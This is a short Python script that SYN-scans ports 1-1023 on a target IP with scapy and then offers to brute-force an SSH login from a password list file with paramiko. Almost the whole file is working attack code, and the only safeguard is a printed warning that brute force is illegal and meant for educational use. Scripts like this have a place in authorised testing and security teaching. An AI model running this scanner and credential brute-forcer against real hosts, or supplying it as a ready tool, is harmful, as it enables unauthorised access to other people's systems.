import paramiko
from scapy.all import *

def scanport(port):
    source_port = RandShort()
    conf.verb = 0
    SynPkt = sr1(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    if not SynPkt:
        return False
    if not SynPkt.haslayer(TCP):
        return False
    if SynPkt[TCP].flags == 0x12:
        RstPkt = sr(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
        return True
    return False

def check_target_availability():
    try:
        conf.verb = 0
        icmp_pkt = sr1(IP(dst=Target) / ICMP(), timeout=3)
        if icmp_pkt:
            return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def brute_force(port, username):
    with open("PasswordList.txt", "r") as file:
        passwords = file.read().splitlines()
    for password in passwords:
        SSHconn = paramiko.SSHClient()
        SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            SSHconn.connect(Target, port=int(port), username=username, password=password, timeout=1)
            print(f"Success! Found password: {password}")
            SSHconn.close()
            break
        except Exception as e:
            print(f"{password} failed.")
            SSHconn.close()

def main():
    global Target
    Target = input("Enter the target IP address: ")
    ports = range(1, 1024)
    open_ports = []
    print(f"Scanning target {Target} for open ports...")
    for port in ports:
        if scanport(port):
            open_ports.append(port)
    if open_ports:
        print(f"Open ports: {open_ports}")
    else:
        print("No open ports in the range 1-1023.")
    if check_target_availability():
        print(f"{Target} is reachable.")
    else:
        print(f"{Target} is unreachable.")
    choice = input("Do you want to perform a brute force attack (Y/N): ").upper()
    if choice == "Y":
        print("Warning: Brute force attacks are illegal and may have serious legal consequences. Use this code only for educational purposes and on devices you have permission to access.")
        username = input("Enter the SSH username: ")
        port = int(input("Enter the port number for the attack: "))
        brute_force(port, username)
    elif choice == "N":
        print("Brute force attack canceled.")
    else:
        print("Invalid choice. Please select Y (Yes) or N (No).")

if __name__ == "__main__":
    main()